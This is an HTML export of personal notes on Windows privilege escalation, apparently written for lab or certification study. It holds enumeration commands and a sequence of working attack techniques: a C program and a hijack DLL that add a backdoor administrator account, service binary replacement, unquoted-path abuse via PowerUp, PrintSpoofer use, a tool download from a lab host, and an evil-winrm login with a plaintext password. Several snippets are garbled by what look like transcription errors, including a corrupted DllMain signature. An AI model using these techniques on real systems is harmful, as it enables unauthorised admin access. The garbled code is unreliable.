<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Windows Privilege Escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Windows Privilege Escalation</h1><br/><p><h1># Windows Enumeration</h1></p><p><ul><li>- <h2>- Username and hostname</h2></p><p></li></ul><div class="codebox"><pre>PS&gt; <span style="color:#ff9d00;font-weight:700">whoami</span></pre></div></p><p></p><p><ul><li>- <h2>- Group memberships of the current user</h2></li></ul></p><p> <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; whoami <span style="color:#ff9d00;font-weight:700">/</span>groups</pre></div></p><p> </p><p> <ul><li>- <h2>- Existing local users and groups</h2></p><p></li></ul><div class="codebox"><pre>net user<br />net user steve<br /><span style="color:#00117f;font-weight:400">Get-LocalUser</span><br /><br />net localgroup<br /><span style="color:#00117f;font-weight:400">Get-LocalGroup</span> <br /><br /><span style="color:#00117f;font-weight:400">Get-LocalGroupMember</span> Administrators<br /></pre></div></p><p></p><p><ul><li>- <h2>- Operating system, version and architecture</h2></p><p></li></ul><div class="codebox"><pre>systeminfo</pre></div></p><p></p><p><ul><li>- <h2>- Network information</h2></p><p></li></ul><div class="codebox"><pre>ipconfig<br /><br />route print<br /><br />netstat <span style="color:#ff9d00;font-weight:700">-</span>ano</pre></div></p><p></p><p><ul><li>- <h2>- Installed applications</h2></p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span> C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>dave&gt; <span style="color:#ff9d00;font-weight:700">Get-ItemProperty</span> <span style="color:#3ad900;font-weight:400">&quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft \Windows\CurrentVe<br />rsion\Uninstall\*&quot;</span> <span style="color:#ff9d00;font-weight:700">select</span> displayname<br /><br /><span style="color:#ff9d00;font-weight:700">PS</span> C<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>dave&gt; <span style="color:#ff9d00;font-weight:700">Get-ItemProperty</span> <span style="color:#3ad900;font-weight:400">&quot;HKLM:\SOFTWARE\Microsoft Windows\CurrentVersion\Uninst</span><br /><span style="color:#3ad900;font-weight:400">all\*&quot;</span> | <span style="color:#ff9d00;font-weight:700">select</span> displayname<br /></pre></div><ul><li>- <h2>- Running processes</h2></p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">Get-Process</span></pre></div></p><p></p><p><ul><li>- <h2>- Locate Files</h2></p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span> C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>dave&gt; <span style="color:#ff9d00;font-weight:700">Get-ChildItem</span> <span style="color:#ff9d00;font-weight:700">-</span>Path C<span style="color:#ff9d00;font-weight:700">:\</span> <span style="color:#ff9d00;font-weight:700">-</span>Include <span style="color:#ff9d00;font-weight:700">*</span>.kdbx <span style="color:#ff9d00;font-weight:700">-</span>File <span style="color:#ff9d00;font-weight:700">-</span>Recurse <span style="color:#333333;font-weight:400">-ErrorAction</span> Sile<br />ntlyContinue<br /><br /><span style="color:#ff9d00;font-weight:700">PS</span> C<span style="color:#ff9d00;font-weight:700">:</span> Users dave› <span style="color:#ff9d00;font-weight:700">Get-ChildItem</span> <span style="color:#ff9d00;font-weight:700">-</span>Path C<span style="color:#ff9d00;font-weight:700">:\</span>xampp Include <span style="color:#ff9d00;font-weight:700">*</span>,txt,<span style="color:#ff9d00;font-weight:700">*</span>ini <span style="color:#ff9d00;font-weight:700">-</span>File <span style="color:#ff9d00;font-weight:700">-</span>Recurse <span style="color:#ff9d00;font-weight:700">-</span> ErrorA<br />ction SilentlyContinue<br /><br /><span style="color:#ff9d00;font-weight:700">PS</span> C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>dave&gt; <span style="color:#ff9d00;font-weight:700">Get-ChildItem</span> <span style="color:#ff9d00;font-weight:700">-</span>Path C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>davel <span style="color:#ff9d00;font-weight:700">-</span>Include <span style="color:#ff9d00;font-weight:700">*</span>.txt,<span style="color:#ff9d00;font-weight:700">*</span>.pdf,<span style="color:#ff9d00;font-weight:700">*</span>.xls,<span style="color:#ff9d00;font-weight:700">*</span>.xlsx,<span style="color:#ff9d00;font-weight:700">*</span>.d<br />oc.<span style="color:#ff9d00;font-weight:700">*</span>.docx <span style="color:#ff9d00;font-weight:700">-</span>File <span style="color:#ff9d00;font-weight:700">-</span>Recurse <span style="color:#333333;font-weight:400">-ErrorAction</span> SilentlvContinue</pre></div></p><p></p><p><ul><li>- <h2>- Run program as different user</h2></p><p></li></ul><div class="codebox"><pre>runas</pre></div></p><p></p><p></p><p><h2>## PowerShell Transcription, PowerShell Script Block Logging</h2></p><p>to use history of commands as attack vector</p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">Get-History</span><br /><br />(<span style="color:#00117f;font-weight:400">Get-PSReadlineOption</span>).HistorySavePath</pre></div></p><p></p><p></p><p>Use Winrm to leverage powershell remoting session</p><p> <div class="codebox"><pre>evil-winrm -i 192.168.50.220 -U daveadmin -p <span style="color:#3ad900;font-weight:400">&quot;quertquertquert123\!\!&quot;</span><br /><span style="color:#0088ff;font-weight:400"># this solves problems with winrm when using it asp pivot from a bind shell</span></pre></div> </p><p> </p><p> </p><p><h2>## Automated Enumeration </h2></p><p>WinPeas</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># File Serving</span><br />iwr <span style="color:#ff9d00;font-weight:700">-</span>uri http<span style="color:#ff9d00;font-weight:700">://</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">118.8</span><span style="color:#ff9d00;font-weight:700">/</span>winPEASx64.exe <span style="color:#ff9d00;font-weight:700">-</span>Outfile winPEAS.exe<br /></pre></div></p><p></p><p><h2>## </h2><strong><h2>Service Binary Hijacking</h2></strong></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Useful commandlets</span><br />services.msc, <span style="color:#ff9d00;font-weight:700">Get-Service</span>, <span style="color:#00117f;font-weight:400">Get-CimInstance</span>, <span style="color:#ff9d00;font-weight:700">Get-WmiObject</span>, <span style="color:#ff9d00;font-weight:700">Get-ACL</span><br /><br /><span style="color:#0088ff;font-weight:400"># Find running processes and list the path</span><br /><span style="color:#ff9d00;font-weight:700">PS</span> C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>dave&gt; <span style="color:#00117f;font-weight:400">Get-CimInstance</span> <span style="color:#ff9d00;font-weight:700">-</span>ClassName win32_service | <span style="color:#ff9d00;font-weight:700">Select</span> Name,State,PathName <br />	| <span style="color:#ff9d00;font-weight:700">Where-Object</span> {<span style="color:#0088ff;font-weight:400">$_</span>.State <span style="color:#ff9d00;font-weight:700">-like</span> <span style="color:#333333;font-weight:400">&#39;Running&#39;</span>}<br /><br /><span style="color:#0088ff;font-weight:400"># List privileges for certain binaries</span><br />icacls <span style="color:#3ad900;font-weight:400">&quot;filepath&quot;</span><br /><br /><br /></pre></div></p><p>Permissions in Windows</p><p>F -&gt; Full access</p><p>M -&gt; Modify access</p><p>RX -&gt; Read and execute access</p><p>R -&gt; Read-only access</p><p>W -&gt; Write-only access</p><p></p><p></p><p><strong>c</strong> <strong>code to add users</strong>:</p><p><div class="codebox"><pre><span style="color:#ff0044;font-weight:400">1</span> #include &lt;stdlib.h&gt;<br /><span style="color:#ff0044;font-weight:400">2</span><br /><span style="color:#ff0044;font-weight:400">3</span> <span style="color:#7f0044;font-weight:400">int</span> main ()<br /><span style="color:#ff0044;font-weight:400">4</span> {<br /><span style="color:#ff0044;font-weight:400">5</span> <span style="color:#7f0044;font-weight:400">int</span> i;<br /><span style="color:#ff0044;font-weight:400">6</span><br /><span style="color:#ff0044;font-weight:400">7</span> i = system (<span style="color:#3ad900;font-weight:400">&quot;net user dave2 password123! /add&quot;</span>);<br /><span style="color:#ff0044;font-weight:400">8</span> i = system (<span style="color:#3ad900;font-weight:400">&quot;net localgroup administrators dave2 /add&quot;</span>);<br /><span style="color:#ff0044;font-weight:400">9</span><br /><span style="color:#ff0044;font-weight:400">10</span> <span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff0044;font-weight:400">0</span>;<br /><span style="color:#ff0044;font-weight:400">11</span> }<br /><span style="color:#ff0044;font-weight:400">12</span><br /><span style="color:#0088ff;font-weight:400">// compile:</span><br /><span style="color:#0088ff;font-weight:400">// x86_64-w64-mingw32-gcc adduser.c -o adduser.exe</span><br /></pre></div></p><p><strong></strong></p><p><strong>## </strong><strong><h3>binary hijacking</h3></strong><h3>:</h3></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">move</span> C<span style="color:#ff9d00;font-weight:700">:\</span>xampp<span style="color:#ff9d00;font-weight:700">\</span>mysq1<span style="color:#ff9d00;font-weight:700">\</span>bin<span style="color:#ff9d00;font-weight:700">\</span>mysqld.exe mysqld.exe<br /><span style="color:#ff9d00;font-weight:700">move</span> .<span style="color:#ff9d00;font-weight:700">\</span>adduser.exe C<span style="color:#ff9d00;font-weight:700">:\</span>xampp<span style="color:#ff9d00;font-weight:700">\</span>mysq1<span style="color:#ff9d00;font-weight:700">\</span>bin<span style="color:#ff9d00;font-weight:700">\</span>mysqld.exe<br />net stop mysql<br /><br /><span style="color:#0088ff;font-weight:400"># check startMode</span><br /><span style="color:#0088ff;font-weight:400"># PS C:\Users\dave&gt; Get-CimInstance -ClassName win32_service | </span><br /><span style="color:#0088ff;font-weight:400">#	Select Name, StartMode | Where-Object {$_.Name -like &#39;mysq&#39;}</span><br /><br />shutdown <span style="color:#ff9d00;font-weight:700">/r</span> <span style="color:#ff9d00;font-weight:700">/</span>t <span style="color:#333333;font-weight:400">0</span><br /><br /><span style="color:#0088ff;font-weight:400">#check if exploit was successful and administrator was added</span><br /><span style="color:#00117f;font-weight:400">Get-LocalGroupMember</span> administrators</pre></div></p><p></p><p></p><p>PowerUp.ps1</p><p><div class="codebox"><pre><span style="color:#00117f;font-weight:400">Get-ModifiableServiceFile</span> <span style="color:#0088ff;font-weight:400"># display services the current user can modify</span><br /><br /><br /><span style="color:#00117f;font-weight:400">Install-ServiceBinary</span> <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#333333;font-weight:400">&#39;mysql&#39;</span> <span style="color:#0088ff;font-weight:400">#Get-ModifiblePath</span><br /></pre></div></p><p><strong></strong></p><p><strong>## </strong><strong><h3>service DLL hijacking</h3></strong></p><p></p><p>safe dll search mode order:</p><p>	1. The directory from which the application loaded.</p><p>	2. The system directory.</p><p>	3. The 16-bit system directory.</p><p>	4. The Windows directory.</p><p>	5. The current directory.</p><p>	6. The directories that are listed in the PATH environment variable.</p><p>	</p><p>download the service you want to monitor</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># use ProcMon</span><br /><span style="color:#0088ff;font-weight:400"># add filter &#39;Process Name is BetaServ.exe&#39;</span><br /><span style="color:#0088ff;font-weight:400"># restart the service so that you can see dll being loaded</span><br /><span style="color:#ff9d00;font-weight:700">Restart-Service</span> BetaService<br /><span style="color:#0088ff;font-weight:400">#check for dll with &#39;name not found&#39;</span><br /><br /><span style="color:#0088ff;font-weight:400">#hijack an arbitrary .dll, DllMain is executed when dll is attached</span><br /></pre></div></p><p></p><p><strong>basic.dll</strong><strong><span style="color:#ff9d00;">:</span></strong></p><p><div class="codebox"><pre>BOOL APIENTRY DllMain(<br />HANDLE hModule,<span style="color:#0088ff;font-weight:400">// Handle to DLL module</span><br />DWORD ul_reason_for_call,<span style="color:#0088ff;font-weight:400">// Reason for calling function</span><br />LPVOID pReserved ) <span style="color:#0088ff;font-weight:400">// Reserved</span><br />{<br />	<span style="color:#ff9d00;font-weight:700">switch</span> (ul_reason_for_call )<br />	{<br />	<span style="color:#ff9d00;font-weight:700">case</span> DLL_PROCESS_ATTACH: <span style="color:#0088ff;font-weight:400">// A process is loading the DLL.</span><br />	<span style="color:#ff9d00;font-weight:700">break</span>;<br />	<span style="color:#ff9d00;font-weight:700">case</span> DLL_THREAD_ATTACH: <span style="color:#0088ff;font-weight:400">// A process is creating a new thread.</span><br />	<span style="color:#ff9d00;font-weight:700">break</span>;<br />	<span style="color:#ff9d00;font-weight:700">case</span> DLL_THREAD_DETACH: <span style="color:#0088ff;font-weight:400">// A thread exits normally.</span><br />	<span style="color:#ff9d00;font-weight:700">break</span>;<br />	<span style="color:#ff9d00;font-weight:700">case</span> DLL_PROCESS_DETACH: <span style="color:#0088ff;font-weight:400">// A process unloads the DLL.</span><br />	<span style="color:#ff9d00;font-weight:700">break</span>;<br />	｝<br /><span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#0088ff;font-weight:700">TRUE</span>;<br />}</pre></div></p><p></p><p>myDLL.dll</p><p><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;windows.h&gt;</span><br />BOOL APIENTRY DllMain(<br />HANDLE hModule, <span style="color:#0088ff;font-weight:400">// Handle to DLL module</span><br />DevoT preserved Ta Reserveason <span style="color:#ff9d00;font-weight:700">for</span> calling function<br />{<br />	<span style="color:#ff9d00;font-weight:700">switch</span> ( ul_reason_for_call )<br />	{<br />		<span style="color:#ff9d00;font-weight:700">case</span> DLL_PROCESS_ATTACH: <span style="color:#0088ff;font-weight:400">// A process is loading the DLL.</span><br />		<span style="color:#7f0044;font-weight:400">int</span> i;<br />		i = system (<span style="color:#3ad900;font-weight:400">&quot;net user dave2 password123! /add&quot;</span>);<br />		i = system (<span style="color:#3ad900;font-weight:400">&quot;net localgroup administrators dave2 /add&quot;</span>);<br />		<span style="color:#ff9d00;font-weight:700">break</span>;<br />		<span style="color:#ff9d00;font-weight:700">case</span> DLL_THREAD_ATTACH: <span style="color:#0088ff;font-weight:400">// A process is creating a new thread.</span><br />		<span style="color:#ff9d00;font-weight:700">break</span>;<br />		<span style="color:#ff9d00;font-weight:700">case</span> DLL_THREAD_DETACH: <span style="color:#0088ff;font-weight:400">// A thread exits normally.</span><br />		<span style="color:#ff9d00;font-weight:700">break</span>;<br />		<span style="color:#ff9d00;font-weight:700">case</span> DLL_PROCESS_DETACH: <span style="color:#0088ff;font-weight:400">// A process unloads the DLL.</span><br />		<span style="color:#ff9d00;font-weight:700">break</span>;<br />	}<br /><span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#0088ff;font-weight:700">TRUE</span>;<br />}<br /><span style="color:#0088ff;font-weight:400">// compile</span><br /><span style="color:#0088ff;font-weight:400">// x86_64-w64-mingw32-gcc mYDLL.cpp -shared -O myDLL.dll</span><br /><span style="color:#0088ff;font-weight:400">// -shared is for dll compilation</span><br /><span style="color:#0088ff;font-weight:400">// serve it and than Restart-Service BetaService to execute</span></pre></div></p><p></p><p><h3>## Unquoted service paths</h3></p><p>we have write permissions on service directory or subdirectories, but cannot replace files in them</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#example</span><br /><span style="color:#0088ff;font-weight:400"># when trying to execute the following path</span><br />C<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">\</span>Program Files<span style="color:#ff9d00;font-weight:700">\</span>My Program<span style="color:#ff9d00;font-weight:700">\</span>My Service<span style="color:#ff9d00;font-weight:700">\</span>service.exe<br /><span style="color:#0088ff;font-weight:400">#Windows will try to execute in order:</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>Program.exe<br />C<span style="color:#ff9d00;font-weight:700">:\</span>Program Files<span style="color:#ff9d00;font-weight:700">\</span>My.exe<br />C<span style="color:#ff9d00;font-weight:700">:\</span>Program Files<span style="color:#ff9d00;font-weight:700">\</span>My Program<span style="color:#ff9d00;font-weight:700">\</span>My.exe<br />C<span style="color:#ff9d00;font-weight:700">:\</span>Program Files<span style="color:#ff9d00;font-weight:700">\</span>My Program<span style="color:#ff9d00;font-weight:700">\</span>My service<span style="color:#ff9d00;font-weight:700">\</span>service.exe<br /><br /><span style="color:#0088ff;font-weight:400"># we can craft and execute some of this</span><br /><span style="color:#0088ff;font-weight:400">#vector:</span><br /><br /><span style="color:#00117f;font-weight:400">Get-CimInstance</span> <span style="color:#ff9d00;font-weight:700">-</span>ClassName win32_service | <span style="color:#ff9d00;font-weight:700">Select</span> Name, State, PathName<br /><span style="color:#0088ff;font-weight:400"># and find unquoted execution paths, or</span><br /><span style="color:#0088ff;font-weight:400">#cmd</span><br />wmic service get name,pathname | findstr <span style="color:#ff9d00;font-weight:700">/</span>i <span style="color:#ff9d00;font-weight:700">/</span>v <span style="color:#3ad900;font-weight:400">&quot;C:\Windows\\&quot;</span> | findstr <span style="color:#ff9d00;font-weight:700">/</span>i <span style="color:#ff9d00;font-weight:700">/</span>v <span style="color:#3ad900;font-weight:400">&quot;&quot;&quot;<br />#\&quot;</span><br /><span style="color:#0088ff;font-weight:400"># /v -&gt; don&#39;t match</span><br /><br /><span style="color:#0088ff;font-weight:400"># now use icacls to see if the current user can write in one of the paths</span><br /><span style="color:#0088ff;font-weight:400"># exploit.exe</span><br /><span style="color:#0088ff;font-weight:400"># check if attack was successfull</span><br />net user<br />net localgroup administators<br /><br /><span style="color:#0088ff;font-weight:400">#with PowerUp.ps1:</span><br /><span style="color:#00117f;font-weight:400">Get-UnquotedService</span><br /><span style="color:#ff9d00;font-weight:700">Write-</span>ServiceBinary <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#333333;font-weight:400">&#39;GammaService&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>Path <span style="color:#3ad900;font-weight:400">&quot;C:\Program Files\Enterprise Apps \Current.exe&quot;</span><br /></pre></div></p><p></p><p><h3>## Scheduled Tasks</h3></p><p><div class="codebox"><pre><span style="color:#00117f;font-weight:400">Get-ScheduledTask</span><br />schtasks <span style="color:#ff9d00;font-weight:700">/</span>query <span style="color:#ff9d00;font-weight:700">/</span>fo LIST <span style="color:#ff9d00;font-weight:700">/</span>v<br /><br /><span style="color:#0088ff;font-weight:400"># search for tasks with admin priv and write permission on the executable</span><br /></pre></div></p><p></p><p></p><p>## SeImpersonatePrivilege or other privileges</p><p><div class="codebox"><pre>whoami <span style="color:#ff9d00;font-weight:700">/</span>priv<br /><span style="color:#0088ff;font-weight:400"># if our user has some strange privilege associated, we</span><br /><span style="color:#0088ff;font-weight:400"># should look on how to exploit it</span><br /><br /><span style="color:#ff9d00;font-weight:700">PS</span> C<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#ff9d00;font-weight:700">\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>dave&gt; .<span style="color:#ff9d00;font-weight:700">\</span>PrintSpoofer64.exe <span style="color:#ff9d00;font-weight:700">-</span>i <span style="color:#ff9d00;font-weight:700">-</span>c powershell.exe<br /><span style="color:#0088ff;font-weight:400"># -i interactive, -c command</span><br /><span style="color:#0088ff;font-weight:400"># Other privileges that may lead to privilege escalation are</span><br /><span style="color:#0088ff;font-weight:400"># SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and</span><br /><span style="color:#0088ff;font-weight:400"># SeDebug</span></pre></div></p></div>
</body>
</html>
